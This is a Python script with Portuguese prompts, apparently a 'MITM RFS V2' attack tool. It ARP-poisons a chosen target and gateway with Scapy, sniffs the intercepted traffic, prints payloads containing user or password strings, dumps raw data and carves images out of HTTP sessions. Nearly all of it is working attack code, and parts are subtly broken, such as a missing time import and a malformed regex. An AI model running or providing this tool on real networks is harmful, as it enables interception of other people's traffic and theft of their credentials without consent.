
from scapy.all import *
import threading,sys,os,signal,re,zlib
print('##################################################################\n')
print ("\n\n MITM RFS V2 \n\n") 
print('##################################################################\n')
VIP = raw_input("[***]Ip do alvo: ") 
GW = raw_input("[***] IP do Gateway: ")
IFACE = raw_input("Nome da interface[ex eth0/ wlan0]:")
packet_count = int(raw_input("Quantidade de pacotes a interceptar: "))
conf.iface = IFACE
conf.verb = 0
pictures_directory = "~/"
faces_directory = "~/"
pcap_file = "bhp.pcap"

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

gateway_mac = get_mac(GW)
if gateway_mac is None:
 print("[XXXXX]Falha ao obter o endereco MAC...")
 sys.exit(0)
else:
 print("[*******] Gateway %s esta no ip %s "%(gateway_mac,GW)) 

target_mac = get_mac(VIP)

if(target_mac is None):
 print("[!!!!] Falha ao obter o MAC do alvo...")
 sys.exit(0)
else:
 print("[********] Alvo %s esta no ip %s "%(target_mac,VIP))
print('_________________________________________________________________\n')

def dnshandle(pkt):
 try:
     send(pkt)
     host = 'Indefined'
     wrpcap(pcap_file,pkt,append=True)
     header = get_http_headers(pkt)
     extract_image(header,pkt)
     carved_images, faces_detected = http_assembler(pcap_file)
 
     if carved_images > 0 :
          print "Extracted: %d images" % carved_images
          print "Detected: %d faces" % faces_detected
          print('[***]Header: %s'%str(header))

     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
          host = pkt.getlayer(DNS).qd.qname
          send(pkt)

     if pkt.haslayer(TCP) and pkt[TCP].payload:
        mail_packet = str(pkt[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*********]Server %s"%pkt[IP].dst)
            print("[$$$$$$$$$] %s"%pkt[TCP].payload)

     if pkt.haslayer(Raw):
	  print('[**********]TARGET[%s] => DEST.HOST[%s]: \n'%(VIP,host))
	  val =  str(pkt).encode('HEX')
	  decoded = str(val).decode('HEX')
	  print('[**********][+]DATA RAW: \n %s \n'%decoded)
          print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n') 
     
     
 except:
   print('[-]Error:/n %s'%sys.exc_info()[0])
   sys.exit(1)
  
def v_poison():
     v = ARP(pdst=VIP,psrc = GW)
     while True:
             try:
                 send(v,verbose=0,inter=2,loop=1)
             except:
                 sys.exit(1) 
def gw_poison():
     gw = ARP(pdst=GW,psrc=VIP)
     while True:
             try:
                 send(gw,verbose=0,inter=1,loop=1)
             except:
                 sys.exit(1)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
 try:
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)
 except:
    sys.exit(1)

def http_assembler(pcap_file):
    carved_images = 0
    faces_detected = 0
    a = rdpcap(pcap_file)
    sessions = a.sessions()
    for session in sessions:
        http_payload = ""
        for packet in sessions[session]:
            try:
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    http_payload += str(packet[TCP].payload)
            except:
                pass
    headers = get_http_headers(http_payload)
    #if headers is None:
        #continue
    image,image_type = extract_image(headers,http_payload)
    if image is not None and image_type is not None:
        # store the image
        file_name = "%s-pic_carver_%d.%s" %(pcap_file,carved_images,image_type)
        fd = open("%s/%s" %(pictures_directory,file_name),"wb")
        fd.write(image)
        fd.close()
        carved_images += 1
        # now attempt face detection
        '''try:
            result = face_detect("%s/%s" %(pictures_directory,file_name),file_name)
            if result is True:
                faces_detected += 1
                except:
                    pass '''
    return carved_images, faces_detected

def get_http_headers(http_payload):
    try:
        # split the headers off if it is HTTP traffic
        headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
        # break out the headers
        headers = dict(re.findall(r"(?P<'name>.*?): (?P<value>.*?)\r\n",headers_raw))
    except:
        return None
    if "Content-Type" not in headers:
        return None
    return headers

def extract_image(headers,http_payload):
    image = None
    image_type = None
    try:
        if "image" in headers['Content-Type']:
            # grab the image type and image body
            image_type = headers['Content-Type'].split("/")[1]
            image = http_payload[http_payload.index("\r\n\r\n")+4:]
            # if we detect compression decompress the image
            try:
                if "Content-Encoding" in headers.keys():
                    if (headers['Content-Encoding'] == "gzip"):
                        image = zlib.decompress(image, 16+zlib.MAX_WBITS)
                    elif(headers['Content-Encoding'] == "deflate"):
                            image = zlib.decompress(image)
            except:
                pass
    except:
        return None,None
    return image,image_type


vthread = [] 
gwthread = [] 
while True:
 try:   
      vpoison = threading.Thread(target=v_poison)
      vpoison.setDaemon(True)
      vthread.append(vpoison)
      vpoison.start()      
      gwpoison = threading.Thread(target=gw_poison)
      gwpoison.setDaemon(True)
      gwthread.append(gwpoison)
      gwpoison.start()
      pkt = sniff(iface=IFACE,filter='',prn=dnshandle,store=0,count=packet_count)
      send(pkt)
      wrpcap(pcap_file,pkt,append=True)
      restore_target(GW,gateway_mac,VIP,target_mac)
      send(VIP)
      send(GW)
      time.sleep(1)

 except:
      restore_target(GW,gateway_mac,VIP,target_mac)
      sys.exit(0)


'''
    poison_thread = threading.Thread(target = poison_target, args =(GW, gateway_mac,VIP,target_mac))
    poison_thread.start()
    bpf_filter = "ip host %s" % VIP
    pkt = sniff(count=packet_count,filter=bpf_filter,iface=IFACE)

def face_detect(path,file_name):
    img = cv2.imread(path)
    cascade = cv2.CascadeClassifier("haarcascade_frontalface_alt.xml")
    rects = cascade.detectMultiScale(img, 1.3, 4, cv2.cv.CV_HAAR_SCALE_IMAGE, (20,20))
    if len(rects) == 0:
        return False
    rects[:, 2:] += rects[:, :2]
    # highlight the faces in the image
    for x1,y1,x2,y2 in rects:
        cv2.rectangle(img,(x1,y1),(x2,y2),(127,255,0),2)
        cv2.imwrite("%s/%s-%s" % (faces_directory,pcap_file,file_name),img)
    return True

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac
    print "[*] Iniciando o  ARP poison..."
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            print "[*] ARP poison ataque terminado"
            return
'''

      
